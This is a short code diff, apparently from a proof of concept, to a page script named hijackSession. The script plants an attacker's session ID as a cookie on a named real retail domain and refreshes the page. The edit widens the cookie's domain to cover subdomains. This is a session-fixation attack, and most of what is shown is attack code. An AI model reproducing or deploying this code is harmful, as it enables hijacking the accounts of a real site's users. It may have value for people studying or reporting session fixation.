@@ -7,7 +7,7 @@
   <script>
     // Function to change PHPSESSID to the attacker's session ID
     function hijackSession() {
-      document.cookie = "36ocil8q0bvffop746jvo3903o; path=/; domain=boozt.com";
+      document.cookie = "36ocil8q0bvffop746jvo3903o; path=/; domain=.boozt.com";
 
       // Simulate a partial page refresh by using fetch (or AJAX)
       fetch(window.location.href, { 
